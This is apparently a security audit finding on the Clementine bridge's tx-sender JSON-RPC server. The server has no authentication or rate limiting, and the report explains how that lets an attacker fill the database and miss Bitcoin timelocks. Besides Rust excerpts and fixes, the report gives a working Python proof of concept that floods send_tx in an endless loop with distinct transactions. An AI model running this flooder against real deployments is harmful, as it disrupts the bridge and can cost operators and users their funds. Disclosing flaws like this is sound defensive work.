### Title
Unauthenticated, Rate-Unlimited tx-sender JSON-RPC Server Enables DB Exhaustion and Bridge Liveness Failure — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The standalone tx-sender JSON-RPC server (`send_tx`, `send_citrea_tx`) is built with no authentication and no rate limiting. When bound to `0.0.0.0` — an explicitly supported and validated configuration — any network-reachable host can submit an unbounded stream of `send_tx` calls, each inserting a unique row into the PostgreSQL tx-sender queue. The only deduplication guard is a per-txid uniqueness check, which is trivially bypassed by varying the transaction. Flooding the queue degrades or halts the tx-sender loop, preventing timely broadcast of challenge, disprove, payout, kickoff, and reimbursement transactions, causing missed Bitcoin timelock windows and material loss of operator collateral or bridged BTC.

---

### Finding Description

`start_jsonrpc_server` in `crates/clementine-tx-sender/src/jsonrpc/server.rs` constructs the HTTP/JSON-RPC server using only `ServerBuilder::default()` with a single `max_request_body_size` guard of 50 MB:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)  // 50 MB
    .build(bind_addr)
    .await
``` [1](#0-0) 

No authentication middleware, no IP allowlist, no rate-limit layer, and no connection concurrency cap are applied. The `send_tx` handler immediately opens a DB transaction and calls `insert_try_to_send`, committing a new row on every successful call:

```rust
let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;
let try_to_send_id = client.insert_try_to_send(&mut dbtx, ...).await.map_err(jsonrpc_err)?;
client.db.commit_transaction(dbtx).await.map_err(jsonrpc_err)?;
``` [2](#0-1) 

The only deduplication guard inside `insert_try_to_send` is a txid-equality check:

```rust
let tx_exists = self.db.check_if_tx_exists_on_txsender(Some(dbtx), txid).await?;
if let Some(try_to_send_id) = tx_exists { return Ok(try_to_send_id); }
``` [3](#0-2) 

An attacker submitting transactions with distinct txids (e.g., varying a single output value or input sequence) bypasses this guard entirely, inserting an unlimited number of rows.

The bind address is validated to accept `0.0.0.0` without any warning:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(BridgeError::EnvVarMalformed(...));
}
``` [4](#0-3) 

When `TX_SENDER_JSONRPC_BIND=0.0.0.0`, the server is network-accessible with no credential check. Even at `127.0.0.1`, any co-located process (e.g., a compromised sidecar container in a Docker deployment) can reach it.

By contrast, the gRPC servers for Operator, Verifier, and Aggregator all apply `RateLimitLayer` and `BufferLayer` and, when `client_verification = true`, enforce mTLS with the `OnlyAggregatorAndSelf` interceptor:

```rust
let server_builder = tonic::transport::Server::builder()
    .layer(BufferLayer::new(config.grpc.req_concurrency_limit))
    .layer(RateLimitLayer::new(
        config.grpc.ratelimit_req_count as u64,
        Duration::from_secs(config.grpc.ratelimit_req_interval_secs),
    ))
    ...
``` [5](#0-4) 

The tx-sender JSON-RPC server has none of these protections.

---

### Impact Explanation

The tx-sender is the sole broadcast path for every time-sensitive bridge transaction. Its queue holds:

- `Challenge` and `Payout` (RBF-managed, directly move bridged BTC)
- `Kickoff`, `Disprove`, `Reimburse`, `WatchtowerChallenge`, `AssertTimeout`, `KickoffNotFinalized`, `LatestBlockhashTimeout`, `OperatorChallengeNack` (CPFP-managed, govern the BitVM challenge/response lifecycle) [6](#0-5) 

Flooding the PostgreSQL queue with millions of junk rows causes two failure modes:

1. **DB storage exhaustion**: PostgreSQL runs out of disk space; subsequent `insert_try_to_send` calls from the legitimate bridge state machine fail, preventing challenge, disprove, and payout transactions from being queued at all.
2. **Loop throughput collapse**: The tx-sender polling loop iterates over all pending rows each cycle. A bloated queue causes each iteration to time out or stall, delaying broadcast of legitimate transactions past their Bitcoin timelock deadlines.

Either failure mode means operators miss the `time_to_send_watchtower_challenge` window (216 blocks on testnet4) or the `operator_reimburse_timelock`, resulting in:
- Operator collateral UTXOs becoming claimable by the wrong party
- Bridged BTC locked permanently if payout transactions are never broadcast
- Reimbursement outputs lost if `ReadyToReimburse` / `Round` transactions are not confirmed in sequence [7](#0-6) 

---

### Likelihood Explanation

- `TX_SENDER_JSONRPC_BIND=0.0.0.0` is a natural choice in Docker/Kubernetes deployments where the tx-sender runs in its own container and must be reachable by the core process in another container.
- The `json-rpc` feature is a first-class, documented, production-targeted feature with its own `main.rs` binary and `run.sh` smoke-test script.
- No firewall rule or network policy is enforced by the code itself; operators must independently configure OS-level restrictions.
- The attack requires only HTTP connectivity to the JSON-RPC port and the ability to generate syntactically valid Bitcoin transactions (trivial with any Bitcoin library).
- The 50 MB per-request body limit means each request can carry a large transaction, amplifying storage consumption per call. [8](#0-7) 

---

### Recommendation

1. **Add authentication**: Require a pre-shared bearer token or restrict connections to a Unix domain socket with filesystem-permission-based access control. The `jsonrpsee` `ServerBuilder` supports middleware layers for this purpose.
2. **Add rate limiting**: Apply a per-IP or global request-rate limit (e.g., via `tower::limit::RateLimitLayer`) analogous to what the gRPC servers already use.
3. **Add a queue-depth cap**: Reject `send_tx` calls when the number of unconfirmed rows in the `try_to_send` table exceeds a configurable maximum, preventing unbounded DB growth regardless of the caller.
4. **Warn on `0.0.0.0` binding**: Emit a startup warning when the JSON-RPC server is bound to `0.0.0.0` without any authentication configured.

### Proof of Concept

```python
import socket, json, itertools, hashlib

HOST = "TARGET_IP"
PORT = 3030

def make_tx(nonce: int) -> str:
    # Vary the locktime field to produce a distinct txid each call.
    # A real attacker would use python-bitcoinlib or similar.
    locktime_hex = format(nonce & 0xFFFFFFFF, '08x')
    # Minimal segwit v0 tx skeleton with varying locktime (4-byte LE)
    lt = bytes.fromhex(locktime_hex)[::-1].hex()
    # version(4) + segwit marker+flag(2) + vin_count(1) + vin(41) +
    # vout_count(1) + vout(9) + witness(2) + locktime(4)
    raw = (
        "02000000"          # version
        "0001"              # segwit marker + flag
        "01"                # 1 input
        + "00"*32 + "00000000" + "ffffffff" + "00"  # outpoint + seq + scriptlen
        + "01"              # 1 output
        + "0000000000000000" + "00"  # 0 sat + empty scriptpubkey
        + "00"              # witness stack count = 0
        + lt                # locktime (varied)
    )
    return raw

url = f"http://{HOST}:{PORT}"
for i in itertools.count():
    payload = json.dumps({
        "jsonrpc": "2.0", "id": i, "method": "send_tx",
        "params": [{
            "tx_metadata": None,
            "signed_tx_hex": make_tx(i),
            "fee_paying_type": "NoFunding",
            "rbf_signing_info": None,
            "cancel_outpoints": [],
            "cancel_txids": [],
            "activate_txids": [],
            "activate_outpoints": [],
        }]
    }).encode()
    with socket.create_connection((HOST, PORT)) as s:
        s.sendall(
            f"POST / HTTP/1.0\r\nHost: {HOST}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(payload)}\r\n\r\n".encode() + payload
        )
        s.recv(4096)  # drain response
    # Each iteration inserts one new row into the tx-sender DB queue.
    # After N iterations the DB fills; legitimate bridge txs can no longer be queued.
```

Each loop iteration inserts one unique row into the `try_to_send` table. The txid deduplication guard in `insert_try_to_send` does not fire because each transaction has a distinct txid (different locktime → different txid). With no rate limit, an attacker on a 1 Gbps link can sustain thousands of inserts per second, exhausting PostgreSQL storage within minutes and halting the tx-sender loop before any Bitcoin timelock expires. ```rust
pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                let insertion_id = client
                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })
}
